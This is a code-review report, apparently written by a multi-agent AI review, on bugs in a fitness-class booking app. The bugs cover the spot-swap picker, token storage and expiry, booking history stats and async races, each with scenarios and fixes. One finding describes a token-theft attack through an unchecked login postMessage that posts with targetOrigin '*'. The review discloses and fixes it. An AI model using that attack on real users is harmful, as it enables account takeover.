# Full App Review — 2026-07-07

> **STATUS (2026-07-07): all phases implemented.** Every confirmed finding below was fixed (plus Phase 5: the iOS calendar sync was rewritten as an authoritative reconcile over the fully Psync-owned target calendar, on the correct @ebarooni/capacitor-calendar v6 API). Deliberate exceptions: corsproxy token pass-through in file:// mode kept (explicit red banner discloses it); tabs.js/app.js double re-entrancy guard kept (the outer guard also suppresses a misleading duplicate toast). Verified end-to-end in-browser + 8-angle code review with fixes applied.

Multi-agent review (124 agents: 5 subsystem mappers, 7 bug hunters + critic, 2-lens adversarial verification per finding).
Stats: 60 raw findings → 49 unique → **52 confirmed** (incl. critic round), 3 disputed, 0 rejected.
Full per-agent traces: ~/.claude/projects/-Users-mustafa-code-projects-psycle-booking/eb38db08-0e53-4762-944b-38866b7773cc/subagents/workflows/wf_ac1be732-7b4/journal.jsonl

Severity counts: critical: 4, high: 15, medium: 21, low: 12

## 1. Spot swap / bike picker (reported bug)

- [x] **[CRITICAL]** Stale _changeSpotContext survives picker close and hijacks the next booking (cancels the wrong booking) — `js/app.js:1418`
  - closeBikePicker (js/app.js:1418-1422) resets _bookingContext and _selectedSlots but never clears window._changeSpotContext (set at js/app.js:3052) and never restores confirmBookBtn.onclick (overridden at js/app.js:3071). _changeSpotContext is only cleared inside executeSpotSwap (js/app.js:3156). If the user abandons a Change-spot flow (backdrop tap -> closeBikePicker via psycle-finder.html:92, or Cancel button), the stale context and the hijacked onclick persist. The next time ANY bike picker is opened via the normal bookClass flow (showBikePicker at js/app.js:1300 sets title/hint but not the button's onclick or text), the confirm button still runs executeSpotSwap with the OLD context: it DE…
  - *Scenario:* User taps 'Change spot' on their Tuesday ride, picker opens, user changes their mind and taps the backdrop to close. Later they tap a Thursday class card and Book; the picker opens (button still labelled 'Swap bike'), they select bike 7 and tap it -> their Tuesday booking is cancelled via DELETE and bike 7 is booked (or fails) in the TUESDAY event; the Thursday class is never booked.
  - *Fix:* In closeBikePicker: set window._changeSpotContext = null, restore confirmBookBtn.textContent = 'Confirm booking', confirmBookBtn.onclick = confirmBikeBooking (or null to fall back to the HTML attribute... note the attribute handler is permanently shadowed once .onclick is assigned, so explicitly reassign confirmBikeBooking).

- [x] **[CRITICAL]** confirmBookBtn.onclick and text never restored after a swap — all subsequent picker bookings are dead until reload — `js/app.js:3071`
  - changeSpot assigns confirmBtn.onclick = executeSpotSwap (js/app.js:3071), permanently shadowing the inline onclick="confirmBikeBooking()" attribute (psycle-finder.html:112). Nothing ever reassigns it: showBikePicker (js/app.js:1300-1391) only toggles .disabled, selectBike only toggles .disabled (js/app.js:1415), and closeBikePicker (js/app.js:1418-1422) touches neither onclick nor textContent. After executeSpotSwap completes (success OR failure), _changeSpotContext is nulled (js/app.js:3156), so executeSpotSwap's guard `if (!ctx || ...) return;` (js/app.js:3113) makes the button a permanent no-op. The button text also stays 'Swapping...' (set at js/app.js:3118, never restored — line 3157 onl…
  - *Scenario:* User successfully swaps bike 4 -> bike 9 (picker closes, toast shown). Later that day they tap Book on another class with a layout: the picker opens, the confirm button reads 'Swapping...', they select a bike, button enables, they tap it -> executeSpotSwap runs, ctx is null, returns immediately -> nothing happens, no error, booking impossible until the app is reloaded.
  - *Fix:* showBikePicker should fully own the confirm button: set textContent = 'Confirm booking' and onclick = confirmBikeBooking on every open; changeSpot then overrides per-open. Also restore text/onclick in closeBikePicker.

- [x] **[HIGH]** Failed swap leaves picker open with a dead 'Swapping...' button (the reported stuck state) — `js/app.js:3118`
  - executeSpotSwap sets confirmBtn.textContent = 'Swapping...' and disables it (js/app.js:3118). On the two failure exits — book-fails branch (js/app.js:3140-3150) and the catch (js/app.js:3151-3154) — closeBikePicker is NOT called (only the success branch calls it at js/app.js:3137), so the picker stays open. The epilogue then nulls _changeSpotContext (js/app.js:3156) and re-enables the button (js/app.js:3157) but never restores its text. Result: picker open, button enabled but still reading 'Swapping...', and tapping it does nothing because executeSpotSwap's guard at js/app.js:3113 returns on null ctx. The user cannot retry the swap at all; the only way out is closing the picker, which itself…
  - *Scenario:* User taps 'Change spot', picks bike 12, taps 'Swap bike'. Another rider grabs bike 12 in the meantime so POST /bookings returns 422 -> toast 'Swap failed', picker stays open, button reads 'Swapping...' and is enabled; user taps it repeatedly -> nothing happens; swap cannot be retried.
  - *Fix:* On failure exits, restore confirmBtn.textContent to 'Swap ' + label, keep _changeSpotContext (but refresh ctx.bookingId from the re-fetched bookings) so the user can retry, or close the picker explicitly with full button reset.

- [x] **[HIGH]** Non-atomic swap: thrown POST after successful cancel loses the user's spot with no recovery, and the recovery rebook is never checked — `js/app.js:3151`
  - executeSpotSwap cancels first (js/app.js:3122-3126) then books. Two spot-loss paths: (1) If the POST for the new slot THROWS (network drop / all 4 retry attempts time out — apiFetchWithRetry rethrows at js/reliability.js:238-241, fetchWithRetry throws lastError at js/reliability.js:205), control jumps to the catch at js/app.js:3151-3154 which only toasts and refreshes — the recovery rebook at js/app.js:3144-3148 lives exclusively in the non-ok-response branch, so the already-cancelled original slot is never rebooked. (2) Even when the recovery rebook does run, its response is ignored (`await apiFetch(...)` with no .ok check, js/app.js:3144-3148); if the original slot was taken in the interim…
  - *Scenario:* User swaps bench 3 -> bench 8 on a train with flaky signal: DELETE succeeds, then the POST's 4 attempts all time out and apiFetch throws -> catch path -> toast 'Swap failed: Request timed out'. The user believes they still have bench 3, but it was cancelled and nothing was rebooked; they discover they lost the class (and possibly the booking window) later.
  - *Fix:* Wrap only the cancel in its own try; once cancel succeeds, run book + recovery in a dedicated try/catch that always attempts the recovery rebook on any failure, check the recovery response, and show an explicit 'your original spot could not be restored' error when it fails.

- [x] **[HIGH]** 15s-timeout retry of non-idempotent swap requests can double-book (old + new spot) or falsely report cancel failure — `js/reliability.js:200`
  - reliability.js replaces window.apiFetch (js/reliability.js:221-242) with fetchWithRetry: every attempt is aborted client-side after 15s (js/reliability.js:166, 175) and an AbortError is 'treated as network error' and retried up to 3 more times (js/reliability.js:199-202). The server can complete an aborted request. For executeSpotSwap's POST of the new slot (js/app.js:3129-3133): attempt 1 times out client-side but books server-side; the retry then returns 409/422 ('already booked'), which is a 4xx returned as-is (js/reliability.js:186); executeSpotSwap's else branch (js/app.js:3140-3150) concludes the booking FAILED and fires the recovery rebook of the ORIGINAL slot — the user ends up booke…
  - *Scenario:* Slow studio wifi: user swaps bike 2 -> bike 10. POST for bike 10 takes 16s server-side; client aborts at 15s and retries; retry gets 409; code toasts 'Swap failed' and rebooks bike 2 -> user is now booked on bike 2 AND bike 10 (double credit), with the UI claiming the swap failed.
  - *Fix:* Do not auto-retry non-idempotent POST /bookings (or use an idempotency key); for DELETE, treat a 404 on a retry attempt as success; in executeSpotSwap, re-fetch bookings before the recovery rebook to check whether the new slot actually got booked.

- [x] **[MEDIUM]** Swap can show 'Swapping...' for over 2 minutes with no feedback (retry/backoff stacking) — `js/reliability.js:166`
  - Each apiFetch call can take up to 4 attempts x 15s timeout (js/reliability.js:166, 171) plus exponential backoff of ~1s+2s+4s (+jitter) (js/reliability.js:209-213) ~= 67s. executeSpotSwap performs two sequential calls (DELETE js/app.js:3123, then POST js/app.js:3129) — worst case well over 2 minutes with the button locked on 'Swapping...' (js/app.js:3118) and no progress indication or abort option. Users perceive this as a hang and reload or close the app mid-swap; if the DELETE had already succeeded, they abandon the flow between cancel and book, silently losing the spot (the in-flight recovery never runs after a reload).
  - *Scenario:* Server is degraded (503s): user taps 'Swap bench'; DELETE retries 4 times (~67s), then POST retries 4 times (~67s). For ~2 minutes the button says 'Swapping...' and nothing else moves; user force-closes the app at the 1-minute mark after the DELETE succeeded -> their bench is cancelled, nothing rebooked.
  - *Fix:* Use a reduced maxRetries (0-1) for the swap's mutating calls, surface attempt progress in the hint, and/or provide an abort; at minimum persist a pending-swap marker so a reload can reconcile.

- [x] **[MEDIUM]** Swap mode books only the first selected slot while the UI invites selecting two, and selecting wipes the change-spot chips — `js/app.js:3115`
  - In the change-spot picker, slot selection goes through the normal selectBike (js/app.js:1393-1416), which allows up to MAX_SEATS selections and overwrites modalHint with 'Bike N selected — pick a second or confirm' (js/app.js:1411-1414). But executeSpotSwap only uses _selectedSlots[0] (js/app.js:3115) — a second selection is silently ignored. Worse, that hint overwrite destroys the multi-slot chips rendered by renderChangeSpotHint (js/app.js:3081-3099), so a user with a 2-seat booking loses the ability to switch which seat they are swapping (setChangeSpotTarget chips are gone) the moment they tap any new slot.
  - *Scenario:* User has bikes 3 and 4 booked, taps 'Change spot', means to swap bike 4: taps new bike 10 first -> the 'Changing: [Bike 3][Bike 4]' chips vanish, replaced by 'Bike 10 selected — pick a second or confirm'; they can no longer select bike 4 as the one to change, confirm, and the default bike 3 (js/app.js:3051) is cancelled instead of bike 4. A user who selects two new bikes gets only the first booked.
  - *Fix:* In swap mode, cap selection to 1 slot and have selectBike call renderChangeSpotHint instead of writing the generic hint (selectBike can branch on window._changeSpotContext).

- [x] **[MEDIUM]** slotBookings maps all seats of a fresh multi-slot booking to one bookingId, so Change spot can cancel the wrong seat — `js/app.js:1555`
  - After a fresh multi-seat booking, submitBooking maps EVERY slot to the single id returned by the POST (js/app.js:1552-1556, comment admits 'fetchMyBookings will correct later'). But nothing forces that correction before Change spot is usable: switchTab('bookings') does not call fetchMyBookings (js/tabs.js:218-260), and refreshUpcomingPanel only re-renders local state (js/app.js:2525). The API stores one booking record per seat (js/app.js:224-242), so the one returned id identifies only one of the two seats. changeSpot/setChangeSpotTarget resolve ctx.bookingId from this map (js/app.js:3055, 3107), so both chips resolve to the SAME id, and the DELETE (js/app.js:3122-3123) cancels whichever sea…
  - *Scenario:* User books bikes 5 and 6 together (POST returns the id of the seat-5 record), stays in the app, switches to My Bookings, taps 'Change spot', picks the 'Bike 6' chip and new bike 11, confirms -> DELETE cancels the bike-5 record, POST books bike 11 -> user ends up on bikes 6 and 11, having lost bike 5 which they wanted to keep.
  - *Fix:* Call fetchMyBookings (or await it) at the start of changeSpot before building _changeSpotContext, and/or disable per-seat change until slotBookings contains distinct ids per slot.

- [x] **[LOW]** Tapping your current (green) seat inside the Change-spot picker cancels it outright and breaks the pending swap context — `js/app.js:1372`
  - showBikePicker wires every 'mine' slot to cancelBikeSlot (js/app.js:1372) regardless of swap mode, and the 'click to cancel' explanation (js/app.js:1328-1329) is replaced by the change-spot hint (js/app.js:3069), so in swap mode nothing tells the user their green seat is a live cancel button. If they tap it (e.g., thinking it toggles which seat to change) and confirm the dialog, the seat is cancelled with no replacement booked. The swap context is also not updated: ctx.bookingId (js/app.js:3055) now points at a deleted booking, so a subsequent 'Swap' tap hits DELETE -> non-ok -> throws 'Failed to cancel old spot' (js/app.js:3124-3125), landing in the stuck 'Swapping...' failure state.
  - *Scenario:* User opens 'Change your bike', taps their own green bike 4 intending to mark it as the one to change, confirms the 'Cancel your Bike 4 booking?' dialog without reading closely -> bike 4 is cancelled outright; they then pick bike 9 and tap Swap -> 'Swap failed: Failed to cancel old spot', dead 'Swapping...' button, and they have no bike at all.
  - *Fix:* In swap mode, render 'mine' slots without the cancelBikeSlot handler (or have the tap call setChangeSpotTarget instead), and clear/refresh _changeSpotContext whenever cancelBikeSlot mutates booking.slots.

## 2. Auth & token lifecycle (reported bug)

- [x] **[CRITICAL]** iOS: AES key lives only in IndexedDB — after a WebKit purge the mirrored ciphertext is undecryptable and gets destructively deleted from Preferences too — `ios-app/www/native-bridge.js:73`
  - native-bridge.js mirrors psycle_bearer_token and psycle_bearer_token_enc to Capacitor Preferences (SYNC_KEYS, ios-app/www/native-bridge.js:72-84) precisely to survive iOS storage purges. But the AES-GCM key that encrypts the _enc blob is stored ONLY in IndexedDB (js/security.js:72-82), which iOS evicts along with localStorage. After a purge: restoreFromNative puts the ciphertext back into localStorage, _getOrCreateKey() finds no key and silently generates a NEW one (js/security.js:75-81), _decrypt fails, and the catch handler removes ENC_TOKEN_KEY (js/security.js:222-226). That localStorage.removeItem is intercepted by the bridge (ios-app/www/native-bridge.js:122-125) and propagates Preferen…
  - *Scenario:* iOS user doesn't open the app for a couple of weeks → WebKit evicts localStorage+IndexedDB (Preferences survives) → next launch restores the _enc blob, decrypt fails against a freshly generated key, the blob is cleared from localStorage AND Preferences → user is silently signed out and the token is gone forever.
  - *Fix:* Mirror the exported AES key bytes (base64) to Capacitor Preferences alongside the ciphertext and restore it into IndexedDB before securityReady's decrypt; never delete the Preferences copy on a decrypt failure (only the local copy).

- [x] **[HIGH]** checkAuth treats ANY non-OK /profile response as session expiry and destroys the token — `js/app.js:366`
  - checkAuth() (js/app.js:325-373) fetches /profile with a raw fetch (no retry — reliability.js only wraps apiFetch, and this call uses fetch directly at js/app.js:337). On any non-2xx response it calls showSessionExpired() (js/app.js:366), which unconditionally clears the stored token via _secureTokenStore.clear() (js/app.js:470-473). res.ok is false for 500/502/503 (server blip, maintenance) and 429 (rate limit), none of which mean the token is invalid. checkAuth runs on every app start (js/app.js:508-509), after the login popup postMessage (js/security.js:311-314), and from the visibilitychange recovery path, so a single transient server error at launch permanently logs the user out. On iOS …
  - *Scenario:* User opens the app while the Psycle API briefly returns 502/429 on GET /profile → checkAuth sees res.ok false → showSessionExpired() wipes psycle_bearer_token_enc and shows the 'session expired' banner → user must re-enter credentials even though their token was perfectly valid.
  - *Fix:* Only call showSessionExpired() when res.status is 401 (or 403 with an auth-specific body). For 5xx/429, keep the token and show a transient 'couldn't reach Psycle' state; route the call through apiFetch so it gets retries.

- [x] **[HIGH]** Global handler logs the user out on ANY 403, including non-auth booking/cancel denials — `js/app.js:63`
  - apiFetch treats 403 identically to 401: `if ((res.status === 401 || res.status === 403) && getBearerToken()) showSessionExpired()` (js/app.js:63-65), and the reliability.js replacement reproduces the same logic (js/reliability.js:229-231), so the monkey-patch does not fix it. showSessionExpired() clears the token (js/app.js:470-473). But 403 is the standard authorization-denied status for business-rule failures with a fully valid session: POST /bookings rejected because the membership plan doesn't cover the class / no credits / booking window closed, or DELETE /bookings/{id} rejected inside the late-cancel window. submitBooking explicitly relies on this global handler (comment at js/app.js:1…
  - *Scenario:* Signed-in user whose plan doesn't include a class taps Book → server responds 403 Forbidden → apiFetch calls showSessionExpired() → valid token is deleted, 'session expired' banner appears, user is signed out and has to log in again — and still can't book, with no explanation of the real reason.
  - *Fix:* Only auto-expire on 401. For 403, surface the server's message to the caller (booking/cancel UI already has error paths) and leave the token intact.

- [x] **[HIGH]** iOS: restoreFromNative races securityReady — restored token isn't seen until the next cold start — `ios-app/www/native-bridge.js:128`
  - restoreFromNative() (ios-app/www/native-bridge.js:87-101, invoked un-awaited at line 128) asynchronously copies the token keys from Capacitor Preferences back into localStorage. Meanwhile security.js's securityReady IIFE (js/security.js:194-228) reads localStorage.getItem for the legacy and _enc keys as soon as its IndexedDB key-open completes. Nothing orders these: native-bridge.js is the LAST deferred script (ios-app/www/psycle-finder.html:213) and each Preferences.get is a native round-trip, so securityReady typically reads localStorage before the restore lands. The only late-recovery path, the visibilitychange handler at js/app.js:494-504, checks ONLY the legacy plaintext key ('psycle_be…
  - *Scenario:* iOS purges the webview's localStorage but Preferences still holds psycle_bearer_token_enc → user opens the app → securityReady reads localStorage before restoreFromNative finishes, finds nothing, _token stays null → app shows 'Sign in' even though a valid token was restored milliseconds later; it only reappears on the NEXT cold launch (and then hits the missing-AES-key bug).
  - *Fix:* Have native-bridge expose a promise (e.g., window.nativeRestoreReady) and make securityReady await it when running under Capacitor; also make the visibilitychange recovery path re-run the _enc decrypt, not just the legacy-key migration.

- [x] **[HIGH]** Orphaned expiry timer: re-logging in during the 5-minute warning window wipes the NEW token at the OLD token's expiry time — `js/security.js:284`
  - scheduleTokenExpiryCheck tracks only the outer warning timer in _expiryTimer (js/security.js:281). When that fires at T-5min it arms an ANONYMOUS inner setTimeout(showSessionExpired, 5min) (js/security.js:284-286) that is never stored, so the clearTimeout(_expiryTimer) at the top of the next scheduleTokenExpiryCheck call (js/security.js:271) cannot cancel it. If the user re-authenticates after seeing the 'Session expiring soon' warning — exactly what the warning tells them to do (js/security.js:267, and the bookClass guard at js/app.js:1182-1192) — the new token is stored and scheduleTokenExpiryCheck re-runs (js/security.js:313, js/app.js:459), but the orphan timer still fires at the old tok…
  - *Scenario:* User sees 'Session expiring soon' toast → signs in again via the login popup → gets a fresh 12-hour token → 5 minutes later (old token's expiry moment) the orphaned timer fires showSessionExpired() → the brand-new valid token is deleted and the 'session expired' banner appears moments after a successful login.
  - *Fix:* Store the inner timeout id (e.g., _expiryTimer2) and clear both at the top of scheduleTokenExpiryCheck; also cancel the timers in clearToken()/showSessionExpired(). Before clearing the token in the timer callback, re-check getTokenExpiry() against Date.now() so a refreshed token is never wiped.

- [x] **[MEDIUM]** AES and XOR ciphertexts share one storage key with no format marker — crypto-availability flips corrupt or destroy the token — `js/security.js:217`
  - Both the AES-GCM path and the XOR fallback write their output to the same localStorage key psycle_bearer_token_enc with no tag distinguishing the formats (js/security.js:157-163). At startup the decoder is chosen solely by whether crypto init succeeded within the 3-second timeout (js/security.js:196-201, 217-221). Two failure directions: (a) token stored with AES, next launch crypto init times out on a slow device → _xorDecode runs on the AES blob and, unlike _decrypt, cannot fail — it returns binary garbage (js/security.js:115-124) which becomes the in-memory token; getBearerToken() then returns garbage, producing either a fetch TypeError (invalid Authorization header characters → 'Failed t…
  - *Scenario:* User logs in on a device where IndexedDB is slow once (crypto init exceeds the 3s timeout) → token is XOR-encoded into psycle_bearer_token_enc → next launch crypto initializes normally → AES-GCM decrypt of the XOR blob throws → token cleared → user is logged out for no visible reason; in the reverse direction a garbage token is sent to the API and the valid stored token gets wiped by the 401 handler.
  - *Fix:* Prefix the stored value with a format marker (e.g., 'aes:' / 'xor:') and decode according to the marker, falling back to re-login only when the marked decoder fails; also make set() await securityReady/_cryptoKey before choosing the XOR branch.

- [x] **[MEDIUM]** Login postMessage has no origin check, and login.html broadcasts the token with targetOrigin '*' — `js/security.js:307`
  - The app-side message handler accepts any message with type PSYCLE_LOGIN_TOKEN and a ≥10-char string, from ANY origin — e.origin is never checked (js/security.js:305-315). Any page that holds a window reference to the app (e.g., embeds it or opened it) can silently overwrite the stored bearer token (session fixation — victim starts using an attacker-controlled account). Conversely, login.html posts the freshly minted token to window.opener with targetOrigin '*' (login.html:186): if a malicious site opens login.html in a popup and the user signs in there, the real Psycle bearer token is delivered to the attacker's window. Both halves of the handshake are unauthenticated despite being same-orig…
  - *Scenario:* Attacker page runs window.open('https://<app-host>/login.html'); user, seeing the genuine Psync login UI, enters their Psycle credentials → login.html posts {type:'PSYCLE_LOGIN_TOKEN', token} to the attacker opener with '*' → attacker now holds the user's API bearer token and can book/cancel as them.
  - *Fix:* In login.html, post to location.origin instead of '*'. In security.js, ignore messages where e.origin !== location.origin.

- [x] **[LOW]** Manually pasted token is not sanitized — a 'Bearer ' prefix yields a doubled header and a misleading 'session expired' banner — `js/app.js:452`
  - The token dialog instructs users to 'Paste token from psyclelondon.com console…' (psycle-finder.html:82), where the Authorization header value is displayed as 'Bearer eyJ…'. saveToken() only trims whitespace (js/app.js:452) before storing, and apiFetch/checkAuth then build 'Bearer ' + token (js/app.js:52, 338), producing 'Authorization: Bearer Bearer eyJ…'. The resulting request fails; in checkAuth a 401 lands in the res.ok-false branch → showSessionExpired() (js/app.js:366), so instead of 'Token not recognised' the user gets the session-expired banner on their very first connect attempt, and the (salvageable) pasted token is discarded.
  - *Scenario:* User copies the full Authorization header value 'Bearer eyJhbGci…' from devtools, pastes it into the Connect dialog, taps Connect → /profile is called with 'Bearer Bearer eyJ…' → 401 → 'Your session expired' banner appears and the token is cleared, even though the pasted credential was valid.
  - *Fix:* In saveToken()/validateToken(), strip a leading /^bearer\s+/i prefix and surrounding quotes/newlines before storing.

- [x] **[LOW]** Sign-out leaves expiry timers and warning state armed, producing spurious 'session expiring/expired' UI while signed out — `js/app.js:463`
  - clearToken() (js/app.js:463-468, wired to the Membership 'Sign out' button at js/tabs.js:174) clears the stored token but does not cancel _expiryTimer or the untracked inner timer in security.js (js/security.js:281-293), does not reset PsycleState._tokenExpiringSoon, and does not hide the sessionBanner. The timers read no token state before firing: _emitExpiring() toasts 'Session expiring soon — sign in again to keep booking' (js/security.js:267) and showSessionExpired() shows the 'session expired' banner (js/app.js:474) regardless. showSessionExpired() likewise never hides the banner's counterpart state when triggered while already signed out.
  - *Scenario:* User with ~4 hours left on their token taps 'Sign out' in the Membership tab → hours later, while browsing the timetable signed-out, the old token's warning timer fires a 'Session expiring soon' toast and then the 'Your session expired' banner appears — even though the user deliberately signed out and has no session.
  - *Fix:* Expose a cancelTokenExpiryCheck() in security.js that clears both timers and resets _tokenExpiringSoon; call it from clearToken() and showSessionExpired(), and hide the sessionBanner in clearToken().

## 3. Booking & data integrity

- [x] **[CRITICAL]** Monkey-patch chain drops submitBooking's opts argument, breaking the entire waitlist flow — `js/reliability.js:309`
  - app.js defines `submitBooking(eventId, slots, btn, opts = {})` (js/app.js:1526) and the waitlist path calls it with `{ waitlist: true }` (js/app.js:1237, js/app.js:3638). But reliability.js (loads right after app.js, psycle-finder.html:202) rebinds window.submitBooking twice with 3-arg signatures and forwards only 3 args: `_originalSubmitBooking(eventId, slots, btn)` at js/reliability.js:309 and `_submitAfterOptimistic(eventId, slots, btn)` at js/reliability.js:506. features.js does the same (`orig.call(this, eventId, slots, btn)`, js/features.js:164-165). Because unqualified `submitBooking(...)` inside app.js resolves to the rebound global, the real submitBooking always receives opts=undefi…
  - *Scenario:* User taps a full class → 'Join the waitlist?' confirm → taps 'Join waitlist'. The button shows 'Booked ✓' (not 'Waitlisted ✓'), the post-booking sheet shows a normal booking, and My Bookings never shows the Waitlisted badge or 'Leave waitlist' — the user believes they have a confirmed seat. If the unverified no-slots POST actually created a billable booking, the safety-net warning at app.js:1565 is also suppressed.
  - *Fix:* Have every wrapper forward all arguments (e.g. `...args` / `apply(this, arguments)` as theme.js:342 already does) in reliability.js:267/309, reliability.js:487/506, and features.js:164-165.

- [x] **[HIGH]** History sync sets psycle_history_synced and reports success even when pagination or detail fetches partially fail — `js/explore.js:1006`
  - _explore_syncHistory silently drops data on partial failure: a non-ok page fetch mid-pagination just breaks the loop (js/explore.js:881), and each of the 30-concurrent /events/{id} detail fetches silently skips on !r.ok (947) or exception (990) — those bookings are omitted from newEntries entirely, not even recorded from the booking record itself. Yet SYNC_KEY is written unconditionally at js/explore.js:1005-1006 and a success toast is shown (1008-1010). Once set, the first-login sync prompt is permanently suppressed (js/app.js:377) and the banner shows 'N bookings in history · Last synced <date>' (explore.js:798-806), so the user has no signal anything is missing.
  - *Scenario:* User with 400 past bookings taps 'Sync my history' on a flaky connection; page 3 of 4 returns HTTP 500 after retries (or a burst of the 30 concurrent detail fetches is rate-limited with 429, which fetchWithRetry does not retry — reliability.js:186). Sync stores e.g. 180 of 400 classes, shows 'Synced 180 past bookings' as success, marks psycle_history_synced — Stats, streaks, instructor map and recommendations are permanently computed from a silen…
  - *Fix:* Count failed pages/detail fetches; if any failed, skip setting SYNC_KEY (or set a partial flag) and toast 'Synced X of Y — tap to retry the rest'.

- [x] **[HIGH]** Week-streak index mixes local-time getTime() with a UTC epoch — UK DST transitions break or merge streaks — `js/tabs.js:879`
  - _weekIndex (js/tabs.js:874-880) computes `Math.floor((localMondayMidnight.getTime() - Date.UTC(1970,0,5)) / (7*dayMs))`. For a Europe/London user, Monday local midnight during BST is Sunday 23:00 UTC, so the numerator is (K*7 days − 1 hour) and floor yields K−1; during GMT it yields K exactly. All summer weeks map to index K−1 and all winter weeks to K, so at the October BST→GMT transition consecutive real weeks get indices (m−1, m+1) — a gap of 2 — and at the March transition two consecutive weeks collapse to the same index. renderStreaks' current-streak walk (`while (weeks[cursor]) cursor--`, js/tabs.js:915-917) and longest-run scan (903-909) both treat the October gap as a broken streak.
  - *Scenario:* A London user attends at least one class every single week through October. The Sunday the clocks go back, their 'Week streak' card on the Stats tab resets from e.g. 14 to 1-2, and 'Longest streak' stops growing, despite no missed week. In March, two genuinely distinct attended weeks count as one, undercounting the longest streak.
  - *Fix:* Compute the week index from local calendar components only, e.g. days = Math.round((Date.UTC(y,m,d) - Date.UTC(1970,0,5))/dayMs) using getFullYear/getMonth/getDate, then floor((days - mondayShift)/7).

- [x] **[MEDIUM]** Explore instructor stats double-count every upcoming booking (history + _myBookings, no dedupe) — `js/explore.js:568`
  - Every booking made in the app is immediately added to psycle_class_history by features.js addHistoryEntry (js/features.js:56-75, via the submitBooking patch at 161-173). computeInstructorMap counts history entries (js/explore.js:544-555) and then counts ALL current bookings again (explore.js:560-570) with no eventId overlap check, inflating per-instructor `count`, `totalBookings` (603), solo/social counts (546-547 only from history, but instructor counts doubled). gatherInstructorProfiles has the same flaw: bookCount incremented from history (explore.js:141) and again from _myBookings (explore.js:155). Contrast tabs.js renderQuickStats, which explicitly skips bookings already in history (js/…
  - *Scenario:* User has 10 past classes with instructor X in history and books 3 upcoming classes with X. Explore's 'Your instructor map' shows 16 classes for X (3 counted twice) and 'Total classes' is inflated by 3; 'Most booked' ranking can flip between instructors based on how many upcoming bookings each currently has.
  - *Fix:* Before counting a current booking, skip it if history already contains its eventId (as tabs.js:406 does).

- [x] **[MEDIUM]** Activity heatmap counts cancelled classes and double-counts upcoming bookings — `js/tabs.js:984`
  - renderHeatmap merges current bookings (js/tabs.js:980-983) with history entries (984-986) but the history loop pushes every entry with a date — it never checks `h.cancelledAt`, unlike every other history consumer (e.g. tabs.js:388, 802, 892; explore.js:138). It also doesn't exclude history entries whose eventId is already in _myBookings, so each upcoming booking is counted twice (it is in both _myBookings and psycle_class_history via features.js addHistoryEntry).
  - *Scenario:* User books and then cancels five Monday 7am classes. The Stats heatmap still shows a hot Monday-7am cell built from classes they never attended; separately, a freshly booked Thursday 6pm class immediately shows intensity 2x relative to genuinely attended slots, skewing maxCount and washing out real habits.
  - *Fix:* In the history loop use `if (h.cancelledAt || !h.date || _myBookings[h.eventId]) return;` (mirroring tabs.js:406 and the cancelledAt guards elsewhere).

- [x] **[MEDIUM]** Spot swap never updates psycle_bike_history — the abandoned slot stays the 'usual spot' — `js/app.js:3111`
  - submitBooking records booked slots into psycle_bike_history (js/app.js:1558 → _recordBikeHistory 1491-1509, increment only). But executeSpotSwap (js/app.js:3111-3158) performs the swap via raw apiFetch DELETE+POST and never calls _recordBikeHistory for the new slot nor decrements the old one. _usualSlotForEvent (1512-1524) picks the highest count, so the slot the user deliberately moved away from keeps its lead forever; the new slot gains no count. The bike picker pre-selects it next time, and headless template booking auto-books it without asking (app.js:3644-3646). Seat cancels (upcomingSeatCancel) likewise never decrement. Swap also bypasses the features.js submitBooking patch, so the psy…
  - *Scenario:* User books Bike 7 five times, then swaps to Bike 12 via 'Change spot' every single time because 7's resistance knob is broken. Counts stay {7:5, 12:0}; next booking the picker pre-selects Bike 7 again, and 'Book my template week' silently books Bike 7 with no picker shown.
  - *Fix:* In executeSpotSwap's success branch, call _recordBikeHistory(ctx.eventId, [newSlot]) and decrement (or delete) the old slot's count; also update the history entry's slots.

- [x] **[MEDIUM]** Cost tracker 'Per week needed' uses calendar-month days instead of the real billing period — `js/tabs.js:1155`
  - renderCostTracker computes daysLeft via _daysLeftInBillingPeriod (js/tabs.js:1338-1343), which is hard-coded to days remaining in the calendar month, even though the subscription's real period_start/period_end are available and are correctly used 60 lines later by _forecastHtml (tabs.js:1223-1231). The 'Per week needed' card (1190-1196) therefore divides remaining classes over the wrong number of days whenever the billing anniversary isn't the 1st.
  - *Scenario:* User's 30-class plan renews on the 10th. On July 1st they have 12 classes left and 9 real days; the card computes daysLeft = 30 (end of July) and shows 'Per week needed: 3' with '12 classes in 30 days', when they actually need ~9/week — they pace off the bad number and forfeit paid classes. Conversely just after renewal it overstates the required pace.
  - *Fix:* Reuse the period-aware daysLeft computation from _forecastHtml (or pass sub into _daysLeftInBillingPeriod and use period_end with the existing replace(' ','T') normalization).

- [x] **[LOW]** 'Book my template week' targets today for weekdays whose class time has already passed — `js/app.js:3606`
  - _upcomingWeekdayDate uses `diff = (dayOfWeek - today.getDay() + 7) % 7`, which is 0 when the template weekday equals today (js/app.js:3603-3610), with no check against the entry's hour/minute. bookWeeklyTemplate then searches today's events (3718, 3735) and best-matches the already-started/past session (3740-3746 has no past filter), so it either reports 'skipped' (if today's class is still in _myBookings, 3724-3733) or attempts to book a past event and reports 'failed' — and in both cases never books next week's occurrence of that slot.
  - *Scenario:* User's template contains 'Monday 7:00am Ride'. Monday at 6pm they tap 'Book my template week' to set up the coming week: the Monday entry resolves to today, matches this morning's 7am class, and the toast reports '1 skipped' (they attended it) or '1 failed' — next Monday's 7am Ride is never booked, and the user only discovers the gap when the class sells out.
  - *Fix:* In _upcomingWeekdayDate (or the caller), when diff === 0 and entry time + tolerance is already past now, add 7 days.

## 4. Races & async ordering

- [x] **[HIGH]** Optimistic-booking wrapper leaves a phantom _myBookings entry when the booking fails (non-ok response or network error) — `js/reliability.js:315`
  - optimisticSubmitBooking writes `_myBookings[eventId] = { bookingId: null, slots }` before the request (reliability.js:301-305) but only reverts in two cases: session expiry (line 315) or if the original throws (line 318). The original submitBooking never throws — it catches its own errors (app.js:1588-1592) and handles non-ok statuses in-band (app.js:1578-1587) — so on any failed booking (422 slot taken, 500, timeout after retries) the phantom entry survives. Consequences: renderMyBookings lists the class as booked, re-rendered cards show 'Booked ✓' with `bookingId: null` (tapping falls back to DELETE /bookings?event_id=... for a booking that doesn't exist), and features.js's wrapper (featur…
  - *Scenario:* Two users race for the last bike; the loser's POST /bookings returns 4xx → button correctly shows 'Failed — retry', but My Bookings now lists the class as booked, the class history gains a bogus entry, and after any re-render the Discover card shows 'Booked ✓' for a class the user is not in.
